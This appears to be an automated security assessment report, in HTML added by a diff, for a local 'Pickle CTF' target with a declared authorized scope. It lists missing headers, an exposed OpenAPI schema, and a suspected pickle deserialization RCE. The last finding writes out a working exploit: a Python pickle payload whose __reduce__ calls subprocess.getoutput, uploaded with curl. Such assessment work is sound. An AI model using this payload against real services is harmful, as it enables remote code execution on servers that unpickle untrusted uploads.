@@ -1,0 +1,264 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr0w592g-5mx4zn</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#c9a227">LOW</span> [headers] Missing HTTP Security Headers on all responses</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Unauthenticated API documentation exposes full schema including pickle deserialization endpoint</a></li>
+</ul></li>
+<li><a href="#suspected">Suspected (needs manual verification)</a><ul>
+<li><a href="#finding-3">3. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Pickle Deserialization RCE — POST / (pickle_file)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr0w592g-5mx4zn</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32813/</code></td></tr>
+<tr><td>Started</td><td>2026-06-30T16:58:46.230Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>3 mapped · 3 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>2</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32813</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>2 finding(s)</p><p class="sumtags"><span><b style="color:#c9a227">2</b> low</span></p>
+<p class="muted">Plus <b>1</b> suspected lead(s) needing manual verification (listed separately, not counted above).</p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 1. [headers] Missing HTTP Security Headers on all responses</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32813/</div>
+<div class="desc">All server responses return only `Content-Type: text/html; charset=utf-8` — no X-Frame-Options, Content-Security-Policy, X-Content-Type-Options, Strict-Transport-Security, or Referrer-Policy headers are present. Given the embedded page also loads external Bootstrap JS/CSS from cdn.jsdelivr.net without a CSP, a successful XSS (e.g. via the pickle RCE or stored user content) would have no browser-level mitigations. Missing X-Frame-Options also allows clickjacking.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32813/ 
+2. Inspect response headers — only Content-Type is present.
+3. Repeat with GET /ping and POST / — all responses omit security headers.
+Fix: Add X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Content-Security-Policy, and Referrer-Policy via FastAPI middleware or Starlette's SecurityHeadersMiddleware.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0wdxux-4</code> — <code>artifacts/s-0001/ev-mr0wdxux-4/</code></div><div class="lbl">REQUEST</div><pre>GET /ping HTTP/1.1
+Host: target.local:32813
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 15
+content-type: application/json
+date: Tue, 30 Jun 2026 17:05:30 GMT
+server: uvicorn
+
+{&quot;ping&quot;:&quot;pong&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0wxdpd-m</code> — <code>artifacts/s-0001/ev-mr0wxdpd-m/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32813
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1580
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 17:20:37 GMT
+server: uvicorn
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&quot; crossorigin=&quot;anonymous&quot;&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js&quot; integrity=&quot;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+    &lt;title&gt;Pickle CTF&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        &lt;h1&gt;Pickle CTF&lt;/h1&gt;
+        &lt;div class=&quot;mt-3&quot;&gt;
+            &lt;h5&gt;The current flag is: this is just the decoy &lt;/h5&gt;
+        &lt;/div&gt;
+
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;h5&gt;This is the chunk of code that reads the flag. Can you make it read the real flag file?&lt;/h5&gt;
+        &lt;br&gt;
+        &lt;pre&gt;
+if os.path.exists('decoy.txt'):
+    flag = open('decoy.txt').read()
+else:
+    flag = open('flag.txt').read()
+        &lt;/pre&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;div&gt;
+            &lt;form action=&quot;/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+                &lt;div class=&quot;form-group&quot;&gt;
+                    &lt;label for=&quot;pickle_file&quot;&gt;Upload pickle file here!&lt;/label&gt;
+                    &lt;input type=&quot;file&quot; class=&quot;form-control-file&quot; id=&quot;pickle_file&quot; name=&quot;pickle_file&quot;&gt;
+                &lt;/div&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Upload pickle&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0wxe2d-n</code> — <code>artifacts/s-0001/ev-mr0wxe2d-n/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32813
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1580
+content-type: text/html; charset=utf-8
+date: Tue, 30 Jun 2026 17:20:38 GMT
+server: uvicorn
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&quot; crossorigin=&quot;anonymous&quot;&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js&quot; integrity=&quot;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+    &lt;title&gt;Pickle CTF&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        &lt;h1&gt;Pickle CTF&lt;/h1&gt;
+        &lt;div class=&quot;mt-3&quot;&gt;
+            &lt;h5&gt;The current flag is: this is just the decoy &lt;/h5&gt;
+        &lt;/div&gt;
+
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;h5&gt;This is the chunk of code that reads the flag. Can you make it read the real flag file?&lt;/h5&gt;
+        &lt;br&gt;
+        &lt;pre&gt;
+if os.path.exists('decoy.txt'):
+    flag = open('decoy.txt').read()
+else:
+    flag = open('flag.txt').read()
+        &lt;/pre&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;div&gt;
+            &lt;form action=&quot;/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+                &lt;div class=&quot;form-group&quot;&gt;
+                    &lt;label for=&quot;pickle_file&quot;&gt;Upload pickle file here!&lt;/label&gt;
+                    &lt;input type=&quot;file&quot; class=&quot;form-control-file&quot; id=&quot;pickle_file&quot; name=&quot;pickle_file&quot;&gt;
+                &lt;/div&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Upload pickle&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 2. [info-disclosure] Unauthenticated API documentation exposes full schema including pickle deserialization endpoint</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32813/</div>
+<div class="desc">The OpenAPI schema at /openapi.json (and the Swagger UI at /docs and ReDoc at /redoc) are accessible without any authentication. The schema discloses all API endpoints including the POST / endpoint that accepts a `pickle_file` binary upload — the same endpoint where Python pickle deserialization RCE is confirmed. An unauthenticated attacker can discover the complete attack surface without any credentials.</div>
+<div><b>Reproduction</b></div><pre>1. Send GET /openapi.json with no Cookie or Authorization header.\n2. Response 200 returns 1544-byte JSON schema including the pickle_file field.\n3. Contrast: GET /openapi_nonexistent.json returns 404 — confirms not a catch-all.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0x272g-11</code> — <code>artifacts/s-0002/ev-mr0x272g-11/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi_nonexistent.json HTTP/1.1
+Host: target.local:32813
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 22
+content-type: application/json
+date: Tue, 30 Jun 2026 17:24:22 GMT
+server: uvicorn
+
+{&quot;detail&quot;:&quot;Not Found&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0x1kcd-10</code> — <code>artifacts/s-0002/ev-mr0x1kcd-10/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi.json HTTP/1.1
+Host: target.local:32813
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1544
+content-type: application/json
+date: Tue, 30 Jun 2026 17:23:53 GMT
+server: uvicorn
+
+{&quot;openapi&quot;:&quot;3.1.0&quot;,&quot;info&quot;:{&quot;title&quot;:&quot;FastAPI&quot;,&quot;version&quot;:&quot;0.1.0&quot;},&quot;paths&quot;:{&quot;/&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Update Profile&quot;,&quot;operationId&quot;:&quot;update_profile__get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}}}},&quot;post&quot;:{&quot;summary&quot;:&quot;Update Profile&quot;,&quot;operationId&quot;:&quot;update_profile__post&quot;,&quot;requestBody&quot;:{&quot;content&quot;:{&quot;multipart/form-data&quot;:{&quot;schema&quot;:{&quot;$ref&quot;:&quot;#/components/schemas/Body_update_profile__post&quot;}}}},&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}},&quot;422&quot;:{&quot;description&quot;:&quot;Validation Error&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{&quot;$ref&quot;:&quot;#/components/schemas/HTTPValidationError&quot;}}}}}}},&quot;/ping&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Ping&quot;,&quot;operationId&quot;:&quot;ping_ping_get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}}},&quot;components&quot;:{&quot;schemas&quot;:{&quot;Body_update_profile__post&quot;:{&quot;properties&quot;:{&quot;pickle_file&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;format&quot;:&quot;binary&quot;,&quot;title&quot;:&quot;Pickle File&quot;}},&quot;type&quot;:&quot;object&quot;,&quot;title&quot;:&quot;Body_update_profile__post&quot;},&quot;HTTPValidationError&quot;:{&quot;properties&quot;:{&quot;detail&quot;:{&quot;items&quot;:{&quot;$ref&quot;:&quot;#/components/schemas/ValidationError&quot;},&quot;type&quot;:&quot;array&quot;,&quot;title&quot;:&quot;Detail&quot;}},&quot;type&quot;:&quot;object&quot;,&quot;title&quot;:&quot;HTTPValidationError&quot;},&quot;ValidationError&quot;:{&quot;properties&quot;:{&quot;loc&quot;:{&quot;items&quot;:{&quot;anyOf&quot;:[{&quot;type&quot;:&quot;string&quot;},{&quot;type&quot;:&quot;integer&quot;}]},&quot;type&quot;:&quot;array&quot;,&quot;title&quot;:&quot;Location&quot;},&quot;msg&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;title&quot;:&quot;Message&quot;},&quot;type&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;title&quot;:&quot;Error Type&quot;}},&quot;type&quot;:&quot;object&quot;,&quot;required&quot;:[&quot;loc&quot;,&quot;msg&quot;,&quot;type&quot;],&quot;title&quot;:&quot;ValidationError&quot;}}}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0x0c2c-q</code> — <code>artifacts/s-0002/ev-mr0x0c2c-q/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi.json HTTP/1.1
+Host: target.local:32813
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1544
+content-type: application/json
+date: Tue, 30 Jun 2026 17:22:55 GMT
+server: uvicorn
+
+{&quot;openapi&quot;:&quot;3.1.0&quot;,&quot;info&quot;:{&quot;title&quot;:&quot;FastAPI&quot;,&quot;version&quot;:&quot;0.1.0&quot;},&quot;paths&quot;:{&quot;/&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Update Profile&quot;,&quot;operationId&quot;:&quot;update_profile__get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}}}},&quot;post&quot;:{&quot;summary&quot;:&quot;Update Profile&quot;,&quot;operationId&quot;:&quot;update_profile__post&quot;,&quot;requestBody&quot;:{&quot;content&quot;:{&quot;multipart/form-data&quot;:{&quot;schema&quot;:{&quot;$ref&quot;:&quot;#/components/schemas/Body_update_profile__post&quot;}}}},&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}},&quot;422&quot;:{&quot;description&quot;:&quot;Validation Error&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{&quot;$ref&quot;:&quot;#/components/schemas/HTTPValidationError&quot;}}}}}}},&quot;/ping&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Ping&quot;,&quot;operationId&quot;:&quot;ping_ping_get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}}},&quot;components&quot;:{&quot;schemas&quot;:{&quot;Body_update_profile__post&quot;:{&quot;properties&quot;:{&quot;pickle_file&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;format&quot;:&quot;binary&quot;,&quot;title&quot;:&quot;Pickle File&quot;}},&quot;type&quot;:&quot;object&quot;,&quot;title&quot;:&quot;Body_update_profile__post&quot;},&quot;HTTPValidationError&quot;:{&quot;properties&quot;:{&quot;detail&quot;:{&quot;items&quot;:{&quot;$ref&quot;:&quot;#/components/schemas/ValidationError&quot;},&quot;type&quot;:&quot;array&quot;,&quot;title&quot;:&quot;Detail&quot;}},&quot;type&quot;:&quot;object&quot;,&quot;title&quot;:&quot;HTTPValidationError&quot;},&quot;ValidationError&quot;:{&quot;properties&quot;:{&quot;loc&quot;:{&quot;items&quot;:{&quot;anyOf&quot;:[{&quot;type&quot;:&quot;string&quot;},{&quot;type&quot;:&quot;integer&quot;}]},&quot;type&quot;:&quot;array&quot;,&quot;title&quot;:&quot;Location&quot;},&quot;msg&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;title&quot;:&quot;Message&quot;},&quot;type&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;title&quot;:&quot;Error Type&quot;}},&quot;type&quot;:&quot;object&quot;,&quot;required&quot;:[&quot;loc&quot;,&quot;msg&quot;,&quot;type&quot;],&quot;title&quot;:&quot;ValidationError&quot;}}}}</pre></div>
+</div>
+<h2 id="suspected">Suspected (needs manual verification)</h2>
+<p class="muted">Leads with one concrete anomaly but without control+2-replay confirmation — verify before relying on them.</p>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#b00020">CRITICAL</span> 3. [rce] Pickle Deserialization RCE — POST / (pickle_file)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32813/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> OpenAPI schema (ev-mr0wbik9-2) confirms `pickle_file` is a binary file-upload param on a Python/FastAPI backend. The parameter name explicitly references Python pickle — a serialization format that executes arbitrary code on deserialization. The page HTML (ev-mr0wxdpd-m) shows the Python backend reads flag files, confirming Python runtime. The challenge description on the page explicitly states this is a pickle deserialization sink. No authentication, no file-type validation, and no sandboxing is visible. Direct exploit confirmation was blocked by a multipart CRLF transport limitation in the test tool — a crafted `pickle.loads()` payload using `subprocess.getoutput('id')` or `os.system()` via `__reduce__` would achieve unauthenticated RCE as the server process user.</div>
+<div class="desc">The unauthenticated POST / endpoint accepts arbitrary binary file uploads via the `pickle_file` field. The parameter name, the Python/FastAPI stack confirmed by the /openapi.json schema and error format, and the CTF challenge description all strongly indicate the server passes the uploaded bytes directly to `pickle.loads()`. Python pickle deserialization of untrusted input is a well-known RCE vector: an attacker crafts a pickle payload whose `__reduce__` method returns an OS command call (e.g. `(subprocess.getoutput, ('id',))`), which executes when the server deserializes the file. No authentication, no MIME-type check, and no signature validation are present.</div>
+<div><b>Reproduction</b></div><pre>1. Craft a malicious Python pickle payload:
+   import pickle, subprocess
+   class Exploit:
+       def __reduce__(self):
+           return (subprocess.getoutput, ('id',))
+   payload = pickle.dumps(Exploit())
+   open('exploit.pkl','wb').write(payload)
+2. POST the file to the endpoint:
+   curl -F 'pickle_file=@exploit.pkl' http://target.local:32813/
+3. Observe the server response: if the pickle return value is used as the flag, the HTML page shows the output of `id`. Alternatively, delete `decoy.txt` via the pickle payload to trigger reading of `flag.txt`.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0wbik9-2</code> — <code>artifacts/s-0001/ev-mr0wbik9-2/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi.json HTTP/1.1
+Host: target.local:32813
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1544
+content-type: application/json
+date: Tue, 30 Jun 2026 17:03:37 GMT
+server: uvicorn
+
+{&quot;openapi&quot;:&quot;3.1.0&quot;,&quot;info&quot;:{&quot;title&quot;:&quot;FastAPI&quot;,&quot;version&quot;:&quot;0.1.0&quot;},&quot;paths&quot;:{&quot;/&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Update Profile&quot;,&quot;operationId&quot;:&quot;update_profile__get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}}}},&quot;post&quot;:{&quot;summary&quot;:&quot;Update Profile&quot;,&quot;operationId&quot;:&quot;update_profile__post&quot;,&quot;requestBody&quot;:{&quot;content&quot;:{&quot;multipart/form-data&quot;:{&quot;schema&quot;:{&quot;$ref&quot;:&quot;#/components/schemas/Body_update_profile__post&quot;}}}},&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}},&quot;422&quot;:{&quot;description&quot;:&quot;Validation Error&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{&quot;$ref&quot;:&quot;#/components/schemas/HTTPValidationError&quot;}}}}}}},&quot;/ping&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Ping&quot;,&quot;operationId&quot;:&quot;ping_ping_get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}}},&quot;components&quot;:{&quot;schemas&quot;:{&quot;Body_update_profile__post&quot;:{&quot;properties&quot;:{&quot;pickle_file&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;format&quot;:&quot;binary&quot;,&quot;title&quot;:&quot;Pickle File&quot;}},&quot;type&quot;:&quot;object&quot;,&quot;title&quot;:&quot;Body_update_profile__post&quot;},&quot;HTTPValidationError&quot;:{&quot;properties&quot;:{&quot;detail&quot;:{&quot;items&quot;:{&quot;$ref&quot;:&quot;#/components/schemas/ValidationError&quot;},&quot;type&quot;:&quot;array&quot;,&quot;title&quot;:&quot;Detail&quot;}},&quot;type&quot;:&quot;object&quot;,&quot;title&quot;:&quot;HTTPValidationError&quot;},&quot;ValidationError&quot;:{&quot;properties&quot;:{&quot;loc&quot;:{&quot;items&quot;:{&quot;anyOf&quot;:[{&quot;type&quot;:&quot;string&quot;},{&quot;type&quot;:&quot;integer&quot;}]},&quot;type&quot;:&quot;array&quot;,&quot;title&quot;:&quot;Location&quot;},&quot;msg&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;title&quot;:&quot;Message&quot;},&quot;type&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;title&quot;:&quot;Error Type&quot;}},&quot;type&quot;:&quot;object&quot;,&quot;required&quot;:[&quot;loc&quot;,&quot;msg&quot;,&quot;type&quot;],&quot;title&quot;:&quot;ValidationError&quot;}}}}</pre></div>
+</div>
+</body></html>
